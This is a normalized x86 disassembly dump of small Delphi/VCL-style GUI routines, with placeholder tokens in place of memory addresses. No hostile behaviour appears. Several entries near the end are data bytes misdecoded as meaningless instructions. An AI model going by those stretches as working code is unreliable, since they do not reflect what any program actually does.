cmp [ eax + 0x1e2 ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1e4 ]
call [ ebx + 0x1e0 ]
sub_44ea3c
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
xor eax eax
mov [ esi + 0x180 ] eax
mov [ esi + 0x1a6 ] 0x0
pop esi
retn
sub_44eb18
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov dx 0xb023
mov eax esi
call sub_44c544
pop esi
retn
sub_44ebdc
push esi
mov si 0xffc1
call sub_403564
pop esi
retn
sub_44ec08
push ebx
mov ecx [ eax + 0x30 ]
test ecx ecx
je r-xdata
pop ebx
retn
mov ebx ecx
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_44ec1c
push ebx
mov ecx [ eax + 0x30 ]
test ecx ecx
je r-xdata
pop ebx
retn
mov ebx ecx
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_44ec30
call sub_44c504
retn
sub_44ec38
call sub_44c504
retn
sub_44ec40
call sub_44c504
retn
sub_44ece8
push ebx
mov ebx eax
mov eax ebx
call sub_44ab9c
mov edx [ ebx + 0x70 ]
mov eax [ ebx + 0x170 ]
call sub_4249a4
mov dx 0xb009
mov eax ebx
call sub_44c544
pop ebx
retn
sub_44ee4c
call sub_44c504
retn
sub_44ee54
call sub_44c504
retn
sub_44ee5c
call sub_44c504
retn
sub_44ee64
call sub_44c504
retn
sub_44eec8
push ebx
mov ecx [ eax + 0x30 ]
test ecx ecx
je r-xdata
pop ebx
retn
mov ebx ecx
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_44f35e
jmp sub_403ae4
sub_44f365
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44f444
push esi
mov esi [ eax + 0x30 ]
test esi esi
je r-xdata
pop esi
retn
mov edx eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xc0 ]
sub_44f5e8
push 0x0
xor ecx ecx
mov edx 0xb034
call sub_44a180
retn
sub_44f688
push ebx
mov ebx eax
mov eax ebx
call sub_44fab8
test al al
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x180 ]
push eax
call UpdateWindow
sub_44f6a4
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x88 ]
pop ebx
retn
sub_44f87c
push ebx
push esi
mov esi edx
mov ebx eax
push esi
mov eax ebx
call sub_44f7b4
push eax
call GetClientRect
pop esi
pop ebx
retn
sub_44f8d4
cmp edx [ eax + 0x16c ]
je r-xdata
retn
mov [ eax + 0x16c ] edx
push 0x0
xor ecx ecx
mov edx 0xb03b
call sub_44a180
sub_44f8f4
cmp dl [ eax + 0x1a5 ]
je r-xdata
retn
mov [ eax + 0x1a5 ] dl
mov [ eax + 0x1a9 ] 0x0
push 0x0
xor ecx ecx
mov edx 0xb010
call sub_44a180
sub_44f918
mov al [ eax + 0x1a9 ]
xor al 0x1
retn
sub_44f924
cmp dl [ eax + 0x1a9 ]
je r-xdata
retn
mov [ eax + 0x1a9 ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb011
call sub_44a180
sub_44f9d0
test [ eax + 0x54 ] 0x8
je r-xdata
call sub_44f974
retn
movsx edx dx
mov [ eax + 0x1a0 ] edx
retn
sub_44faac
jmp sub_403ae4
sub_44fab3
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44fcd2
jmp sub_403ae4
sub_44fcd9
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_44fde0
call sub_449f50
retn
sub_45022e
jmp sub_403ae4
sub_4502c4
mov eax [ r-xdata ]
retn
sub_45042b
jmp sub_403ae4
sub_45053c
cmp dl [ eax + 0x165 ]
je r-xdata
retn
mov [ eax + 0x165 ] dl
push 0x0
xor ecx ecx
mov edx 0xb03b
call sub_44a180
sub_450852
jmp sub_403ae4
sub_450994
test [ eax + 0x52 ] 0x4
setne al
retn
sub_450af0
jmp sub_403ae4
sub_450af7
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
call sub_425064
retn
sub_450b13
jmp sub_403ae4
sub_450b20
retn
sub_450bf4
mov [ edx + 0xc ] 0xffffffff
retn
sub_450c52
jmp sub_403ae4
sub_450c59
pop ecx
pop ecx
pop ebp
retn
sub_450cf9
jmp sub_403ae4
sub_450d00
pop ebx
mov esp ebp
pop ebp
retn
sub_450d6c
call sub_44cd0c
retn
sub_450dff
jmp sub_403ae4
sub_450e06
pop esi
pop ecx
pop ecx
pop ebp
retn
sub_450fe5
jmp sub_403ae4
sub_450fec
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_451208
jmp sub_403ae4
sub_45125c
cmp dx [ eax + 0x68 ]
je r-xdata
retn
mov [ eax + 0x68 ] dx
cmp [ eax + 0x6a ] 0x0
je r-xdata
call sub_451148
sub_4513a0
push ebx
mov ebx eax
mov eax ebx
call sub_4560a8
test al al
je r-xdata
pop ebx
retn
push 0xffffffff
call ImageList_DragShowNolock
sub_4513b8
push ebx
mov ebx eax
mov eax ebx
call sub_4560a8
test al al
je r-xdata
pop ebx
retn
push 0x0
call ImageList_DragShowNolock
sub_4514a4
push ebx
push esi
mov esi edx
mov ebx eax
or [ ebx + 0x54 ] 0x100
mov edx esi
mov eax ebx
call sub_44d944
and [ ebx + 0x54 ] 0xfeff
pop esi
pop ebx
retn
sub_45153f
jmp sub_403ae4
sub_451546
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_451569
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_425064
retn
sub_451562
jmp sub_403ae4
sub_451569
pop ebx
pop ecx
pop ebp
retn
sub_451570
retn
sub_4515d8
xor edx edx
mov eax [ eax + 0x8 ]
test eax eax
je r-xdata
mov eax edx
retn
mov eax [ eax + 0xc ]
inc edx
test eax eax
jne r-xdata
sub_451945
jmp sub_403ae4
sub_451b2c
mov eax [ eax + 0x8 ]
jmp r-xdata
mov edx [ eax + 0xc ]
test edx edx
jne r-xdata
mov eax edx
retn
sub_451d18
jmp sub_403ae4
sub_451dc8
mov eax [ eax + 0x14 ]
mov al [ eax + 0x5b ]
dec eax
sub al 0x2
jae r-xdata
add [ ecx + 0x4 ] 0xc
retn
add [ ecx ] 0xc
retn
sub_451ddc
inc [ eax + 0x6c ]
retn
sub_451de0
dec [ eax + 0x6c ]
cmp [ eax + 0x6c ] 0x0
jg r-xdata
retn
xor edx edx
mov [ eax + 0x6c ] edx
call sub_453660
sub_451f40
call sub_452640
test eax eax
je r-xdata
xor eax eax
retn
mov eax [ eax + 0x4 ]
retn
sub_4528eb
jmp sub_403ae4
sub_4528f2
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45290f
lea eax [ ebp - 0xc ]
call sub_404164
retn
sub_452908
jmp sub_403ae4
sub_45290f
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_452bf0
jmp sub_403ae4
sub_452bf7
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_452c14
mov eax [ ebp - 0x4 ]
call sub_425064
retn
sub_452c0d
jmp sub_403ae4
sub_452c14
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_452c31
mov eax [ ebp - 0x4 ]
call sub_403368
retn
sub_452c2a
jmp sub_403ae4
sub_452c31
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4530e5
jmp sub_403ae4
sub_4530ec
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_453277
jmp sub_403ae4
sub_45327e
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_453333
jmp sub_403ae4
sub_45333a
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_453428
jmp sub_403ae4
sub_453479
jmp sub_403ae4
sub_453480
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45353c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_451e4c
mov [ ebx + 0x38 ] eax
pop esi
pop ebx
retn
sub_453688
cmp [ eax + 0x6c ] 0x0
jne r-xdata
retn
mov eax edx
call sub_451988
sub_453f88
jmp sub_403ae4
sub_453f8f
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_454058
call GetCapture
retn
sub_454060
push ebx
mov ebx edx
push ebx
call GetCursorPos
call sub_40cfd0
pop ebx
retn
sub_454070
push ebx
mov ebx eax
push 0x13
mov eax [ rw-data ]
mov eax [ eax ]
call eax
cmp eax 0x1
sbb eax eax
inc eax
mov [ ebx + 0xc ] al
pop ebx
retn
sub_4542d6
jmp sub_403ae4
sub_4544d0
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
retn
push eax
call [ rw-data ]
retn
sub_4546e4
jmp sub_403ae4
sub_4546eb
pop ebx
mov esp ebp
pop ebp
retn
sub_454736
add [ eax ] al
push ebx
mov ebx eax
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xe0 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0xe4 ]
pop ebx
retn
sub_4547b3
jmp sub_403ae4
sub_4547ba
pop ebp
retn
sub_454842
jmp sub_403ae4
sub_454849
pop ebp
retn
sub_4548f6
out dx eax
push edx
push ecx
jmp [ eax + edx * 2 + 0x50d00045 ]
sub_454f98
mov edx [ eax + 0x5c ]
test edx edx
je r-xdata
or eax 0xffffffff
retn
mov edx [ edx + 0x30 ]
xchg edx eax
call sub_4188fc
retn
sub_454fb0
mov al 0x1
retn
sub_454fb4
mov edx [ eax + 0x5c ]
test edx edx
je r-xdata
call sub_4215b4
retn
mov eax edx
retn
sub_454fc4
cmp [ eax + 0x5c ] 0x0
je r-xdata
call sub_421584
retn
mov al 0x1
retn
sub_4552b4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_4188a0
pop esi
pop ebx
retn
sub_4552c8
mov eax [ eax + 0x30 ]
mov eax [ eax + 0x8 ]
retn
sub_455304
cmp edx [ eax + 0x38 ]
jne r-xdata
retn
mov edx [ eax ]
call [ edx + 0x30 ]
sub_455568
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4034f4
pop ebx
retn
sub_45557c
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4034f4
pop ebx
retn
sub_455590
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4034f4
pop ebx
retn
sub_4555a4
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4034f4
pop ebx
retn
sub_4555b8
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4034f4
pop ebx
retn
sub_4555cc
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4034f4
pop ebx
retn
sub_4555e0
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4034f4
pop ebx
retn
sub_4555f4
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4034f4
pop ebx
retn
sub_455608
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4034f4
pop ebx
retn
sub_45561c
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4034f4
pop ebx
retn
sub_455630
retn
sub_455634
retn
sub_455638
retn
sub_45563c
retn
sub_455640
retn
sub_455644
retn
sub_455648
retn
sub_45564c
retn
sub_455650
retn
sub_455654
retn
sub_455658
retn
sub_45565c
retn
sub_455908
jmp sub_403ae4
sub_455ca4
push ebx
mov ebx eax
cmp [ ebx + 0x90 ] 0x0
jne r-xdata
mov eax [ ebx + 0x90 ]
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403338
mov [ ebx + 0x90 ] eax
sub_455ccc
push esi
mov si 0xffef
call sub_403564
pop esi
retn
sub_455d6d
jmp sub_403ae4
sub_455d74
pop ebp
retn
sub_455d78
sub [ rw-data ] 0x1
jae r-xdata
retn
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_417f20
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_417f20
sub_455f18
mov edx eax
sub edx 0xff000000
je r-xdata
mov eax 0x20000000
sub edx 0xffffff
jne r-xdata
retn
mov eax 0x1fffffff
retn
sub_45609d
jmp sub_403ae4
sub_4560a4
pop ebx
pop ecx
pop ebp
retn
sub_4560a8
cmp [ eax + 0x3c ] 0x0
setne al
retn
sub_4560b0
cmp [ eax + 0x3c ] 0x0
jne r-xdata
retn
call sub_456280
sub_45615d
jmp sub_403ae4
sub_456164
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x54 ]
test eax eax
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
call sub_403368
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x54 ] edx
sub_456313
jmp sub_403ae4
sub_45631a
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4563b2
jmp sub_403ae4
sub_4563b9
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4563d6
mov eax [ ebp - 0xc ]
call sub_403368
retn
sub_4563cf
jmp sub_403ae4
sub_4563d6
mov eax [ ebp - 0x4 ]
mov si 0xffef
call sub_403564
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45648f
jmp sub_403ae4
sub_456496
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45649c
or edx 0xffffffff
call sub_456410
retn
sub_4568ab
jmp sub_403ae4
sub_4568b2
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4568cf
mov eax [ ebp - 0xc ]
call sub_403368
retn
sub_4568c8
jmp sub_403ae4
sub_4568cf
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4568ec
mov eax [ ebp - 0x4 ]
call sub_4573e4
retn
sub_4568e5
jmp sub_403ae4
sub_4568ec
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_456af0
jmp sub_403ae4
sub_456af7
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_456afc
push esi
mov esi eax
cmp dl [ esi + 0x40 ]
je r-xdata
pop esi
retn
mov [ esi + 0x40 ] dl
mov eax esi
mov si 0xffef
call sub_403564
sub_456b14
push ebx
mov ebx edx
mov ecx ebx
xor edx edx
xor eax eax
call sub_41723c
pop ebx
retn
sub_456bb8
mov [ edx + 0x4 ] eax
mov ecx [ eax + 0x4c ]
test ecx ecx
je r-xdata
retn
mov eax ecx
call sub_418744
sub_456ccf
jmp sub_403ae4
sub_456cd6
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_403368
retn
sub_456cec
jmp sub_403ae4
sub_456ffe
jmp sub_403ae4
sub_457005
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_457022
mov eax [ ebp - 0x10 ]
call sub_403368
retn
sub_45701b
jmp sub_403ae4
sub_457022
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45703f
mov eax [ ebp - 0x8 ]
call sub_403368
retn
sub_457038
jmp sub_403ae4
sub_45703f
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4570a8
jmp sub_403ae4
sub_4571c1
jmp sub_403ae4
sub_4571de
jmp sub_403ae4
sub_457396
jmp sub_403ae4
sub_45739d
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4573e0
inc [ eax + 0x5c ]
retn
sub_4573e4
push esi
cmp [ eax + 0x5c ] 0x0
jle r-xdata
cmp [ eax + 0x58 ] 0x0
je r-xdata
dec [ eax + 0x5c ]
pop esi
retn
mov [ eax + 0x58 ] 0x0
mov si 0xffef
call sub_403564
sub_457438
push ebx
cmp [ eax + 0xa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx [ eax + 0x4 ]
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
sub_457475
jmp sub_403ae4
sub_45747c
pop ebp
retn
sub_457480
sub [ rw-data ] 0x1
retn
sub_4578cc
clc
push edx
push ecx
[ ebx + esi * 4 - 0x5253ffbb ]
sub_4583e8
mov eax [ esp + 0x8 ]
retn
sub_4583f0
push ebx
mov ebx eax
call sub_4583e8
push eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bbf8
jmp sub_403b1c
sub_45840c
pop ebx
retn
sub_458685
jmp sub_403ae4
sub_45868c
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4587d7
jmp sub_403ae4
sub_4587de
mov eax edi
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4587f4
push ebx
mov eax [ rw-data ]
call sub_418e10
mov ebx eax
movzx edx bx
mov cl 0x1
mov eax [ rw-data ]
call sub_418dcc
mov eax ebx
pop ebx
retn
sub_45897c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_403518
mov [ ebx + 0x18 ] eax
pop esi
pop ebx
retn
sub_458998
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403518
mov al [ eax + 0x95 ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0xa8 ]
sete al
pop ebx
retn
sub_459093
jmp sub_403ae4
sub_45909a
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_459192
jmp sub_403ae4
sub_459199
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4595bc
jmp sub_403ae4
sub_4595c3
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_459a6f
jmp sub_403ae4
sub_459f10
jmp sub_403ae4
sub_459f17
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45a37b
jmp sub_403ae4
sub_45a838
jmp sub_403ae4
sub_45a83f
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45abea
jmp sub_403ae4
sub_45abf1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_45abff
inc [ ecx ]
add [ eax ] al
add [ 0xffffffffb0000000 ] ch
add ebx eax
nop
cmp dl [ eax + 0x48 ]
je r-xdata
retn
mov [ eax + 0x48 ] dl
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_45adac
mov eax [ r-xdata ]
retn
sub_45ade8
cmp dx [ eax + 0x60 ]
je r-xdata
retn
mov [ eax + 0x60 ] dx
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_45adfc
cmp dl [ eax + 0x3e ]
je r-xdata
retn
mov [ eax + 0x3e ] dl
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_45ae0c
cmp edx [ eax + 0x40 ]
je r-xdata
retn
mov [ eax + 0x40 ] edx
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_45ae1c
or edx 0xffffffff
mov ecx [ eax + 0x64 ]
test ecx ecx
je r-xdata
mov eax edx
retn
mov edx eax
mov eax ecx
call sub_45b118
mov edx eax
sub_45aeb4
push ebx
push esi
mov esi ecx
mov ebx edx
mov eax ebx
mov edx [ r-xdata ]
call sub_403518
mov edx esi
call sub_45ae34
pop esi
pop ebx
retn
sub_45af30
mov edx [ eax + 0x44 ]
test edx edx
je r-xdata
retn
mov eax edx
mov edx [ eax ]
call [ edx + 0x1c ]
sub_45b118
push esi
or ecx 0xffffffff
mov esi [ eax + 0x5c ]
test esi esi
je r-xdata
mov eax ecx
pop esi
retn
mov eax esi
call sub_4188fc
mov ecx eax
sub_45b308
mov edx [ eax + 0x64 ]
test edx edx
je r-xdata
mov eax edx
retn
cmp [ edx + 0x70 ] 0x0
je r-xdata
mov eax [ edx + 0x70 ]
retn
sub_45b370
jmp r-xdata
mov edx [ eax + 0x64 ]
test edx edx
jne r-xdata
mov eax edx
mov eax [ eax + 0x70 ]
retn
sub_45b718
cmp edx [ eax + 0x7c ]
jne r-xdata
retn
call sub_45b74c
sub_45b74c
mov edx sub_45b724
mov ecx eax
mov eax [ eax + 0x68 ]
xchg edx eax
call sub_458874
retn
sub_45b936
jmp sub_403ae4
sub_45b93d
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45bdd4
jmp sub_403ae4
sub_45be13
jmp sub_403ae4
sub_45be1a
mov al [ ebp - 0x1a ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45bfb8
cmp dl [ eax + 0x3c ]
je r-xdata
retn
mov [ eax + 0x3c ] dl
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_45c0f4
push ebp
mov ebp esp
push esi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ eax + 0x34 ]
mov si 0xfffd
call sub_403564
pop esi
pop ebp
retn 0x8
sub_45c110
mov eax [ eax + 0x34 ]
call sub_459348
retn
sub_45c11c
push esi
mov esi eax
mov eax [ esi + 0x34 ]
mov si 0xfff9
call sub_403564
pop esi
retn
sub_45c158
push ebx
mov ecx sub_45c130
mov edx [ eax + 0x34 ]
mov ebx [ edx + 0x68 ]
mov eax edx
xchg ecx eax
mov edx ebx
call sub_458874
pop ebx
retn
sub_45c38c
cmp [ eax + 0x40 ] 0x0
jne r-xdata
mov al 0x1
retn
cmp [ eax + 0x48 ] 0x0
jne r-xdata
xor eax eax
retn
sub_45c3a0
jmp r-xdata
test edx edx
jle r-xdata
retn
test eax eax
jne r-xdata
mov eax [ eax + 0x64 ]
dec edx
sub_45c4d5
jmp sub_403830
sub_45c5d7
jmp sub_403ae4
sub_45c602
jmp sub_403ae4
sub_45c609
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov al 0x1
cmp [ ebp - 0x14 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
pop ebx
mov esp ebp
pop ebp
retn
sub_45c620
mov al [ eax + 0x41 ]
xor al 0x1
retn
sub_45c808
cmp dl [ eax + 0x40 ]
je r-xdata
retn
mov [ eax + 0x40 ] dl
call sub_45c158
sub_45c888
jmp sub_403ae4
sub_45c8cc
push ebx
cmp [ eax + 0x52 ] 0x0
je r-xdata
pop ebx
retn
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
sub_45c8e4
push ebx
mov ebx eax
mov eax ebx
call sub_4215d4
xor ecx ecx
xor edx edx
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x30 ]
pop ebx
retn
sub_45c936
add [ eax ] al
cmp edx [ eax + 0x48 ]
jne r-xdata
retn
call sub_45c158
sub_45c9ac
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov al 0x1
retn
sub_45caf5
jmp sub_403ae4
sub_45cafc
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_45cd3c
cmp dl [ eax + 0x41 ]
je r-xdata
retn
mov [ eax + 0x41 ] dl
call sub_45cd4c
sub_45cda0
mov eax [ eax + 0x34 ]
movzx eax [ eax + 0x3b ]
mov al [ eax + rw-data ]
retn
sub_45cdb0
and edx 0x7f
mov dl [ edx + rw-data ]
mov eax [ eax + 0x34 ]
mov [ eax + 0x3b ] dl
retn
sub_45cdc0
mov eax [ eax + 0x34 ]
movzx eax [ eax + 0x3c ]
mov al [ eax + rw-data ]
retn
sub_45cdd0
and edx 0x7f
mov dl [ edx + rw-data ]
mov eax [ eax + 0x34 ]
mov [ eax + 0x3c ] dl
retn
sub_45cde0
cmp dl [ eax + 0x5c ]
je r-xdata
retn
mov [ eax + 0x5c ] dl
mov edx [ eax + 0x38 ]
test edx edx
je r-xdata
push 0x0
push 0x0
push 0xb015
push edx
call SendMessageA
sub_45ce58
test edx edx
je r-xdata
xor edx edx
mov eax [ eax + 0x34 ]
call sub_4591a0
retn
mov eax [ eax + 0x34 ]
mov edx [ edx + 0x34 ]
call sub_4591a0
retn
sub_45ce74
test edx edx
je r-xdata
retn
mov ecx [ eax + 0x34 ]
mov ecx [ ecx + 0x68 ]
cmp ecx [ edx + 0x34 ]
jne r-xdata
xor edx edx
mov eax [ eax + 0x34 ]
call sub_4591a0
sub_45cebc
mov edx [ eax + 0x58 ]
test edx edx
je r-xdata
call sub_45c110
retn
mov eax edx
retn
sub_45cef6
jmp sub_403830
sub_45cefb
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_468b5c
call sub_403b98
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45d261
jmp sub_403ae4
sub_45d268
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x14 ]
call sub_403368
retn
sub_45d27e
jmp sub_403ae4
sub_45d37f
jmp sub_403ae4
sub_45d386
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45d3a3
mov eax [ ebp - 0x14 ]
call sub_403368
retn
sub_45d39c
jmp sub_403ae4
sub_45d3c1
jmp sub_403ae4
sub_45d44b
jmp sub_403ae4
sub_45d452
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45d484
push ebx
mov ebx eax
mov eax ebx
call sub_418a3c
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx + 0x10 ]
call sub_422384
sub_45d548
push ebx
cmp [ eax + 0x72 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov eax [ ebx + 0x74 ]
call [ ebx + 0x70 ]
sub_45d55c
mov eax [ eax + 0x34 ]
mov eax [ eax + 0x54 ]
retn
sub_45d564
mov eax [ eax + 0x34 ]
mov [ eax + 0x54 ] edx
retn
sub_45d929
jmp sub_403ae4
sub_45d930
mov eax ebx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_45da30
jmp sub_403ae4
sub_45da37
pop ebp
retn
sub_45def2
inc esp
add al dh
int3
sub_45def6
inc esp
add [ eax + 0x500044cb ] ch

sub_45defe
inc esp
add al cl
test [ eax + eax - 0x68 ] 0x9c0044d5
or [ ebp ] eax
inc esp
hlt
sub_45e4ee
inc esp
add al dh
int3
sub_45e4f2
inc esp
add [ ecx + edi ] al
inc esi
add [ eax - 0x35 ] dl
inc esp
add al cl
test [ eax + eax - 0x8 ] 0x9c00463f
or [ ebp ] eax
inc esp
hlt
sub_45e5c7
[ edi + edi * 8 - 0x2f002f ]
sub_45e5ce
stc
jmp esp
sub_45e704
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec esp
call sub_45e75b
sub_45e7f2
inc esp
add al dh
int3
sub_45e7f6
inc esp
add [ ecx + edi ] al
inc esi
add [ eax - 0x35 ] dl
inc esp
add al cl
test [ eax + eax - 0x8 ] 0x9c00463f
or [ ebp ] eax
inc esp
hlt
sub_45f592
inc esp
add al dh
int3
sub_45f596
inc esp
add [ ecx + edi ] al
inc esi
add [ eax - 0x35 ] dl
inc esp
add al cl
test [ eax + eax - 0x8 ] 0x9c00463f
or [ ebp ] eax
inc esp
hlt
sub_45f890
mov eax [ rw-data ]
retn
sub_45f898
mov [ rw-data ] eax
retn
sub_45f9e0
jmp sub_403830
sub_45fa17
jmp sub_403ae4
sub_45fa1e
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45fbec
call sub_4222ac
retn
sub_45fd2e
jmp sub_403ae4
sub_45fd35
mov eax ebx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_45fdd9
jmp sub_403ae4
sub_45fde0
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45fe70
mov al [ eax + 0x1f ]
xor al 0x1
retn
sub_46059c
cmp edx [ eax + 0x28 ]
je r-xdata
retn
mov [ eax + 0x28 ] edx
mov [ eax + 0x2c ] 0x0
mov [ eax + 0x44 ] 0x1
mov eax [ eax + 0x4 ]
call sub_460c48
sub_4605b8
cmp dl [ eax + 0x2c ]
je r-xdata
retn
mov [ eax + 0x2c ] dl
test dl dl
je r-xdata
mov edx 0xff000014
call sub_46059c
sub_4606d8
cmp dl [ eax + 0x34 ]
je r-xdata
retn
mov [ eax + 0x34 ] dl
mov [ eax + 0x44 ] 0x1
mov eax [ eax + 0x4 ]
call sub_460c48
sub_4606f0
cmp edx [ eax + 0x38 ]
je r-xdata
retn
mov [ eax + 0x38 ] edx
mov [ eax + 0x44 ] 0x1
mov eax [ eax + 0x4 ]
call sub_460c48
sub_460708
mov ecx edx
mov [ eax + 0x10 ] ecx
test ecx ecx
jge r-xdata
mov eax [ eax + 0x4 ]
call sub_460c48
retn
xor edx edx
mov [ eax + 0x10 ] edx
sub_460734
mov eax [ eax + 0x4 ]
mov al [ eax + 0x210 ]
xor al 0x1
retn
sub_460740
mov [ eax + 0x1c ] dl
mov eax [ eax + 0x4 ]
call sub_460c48
retn
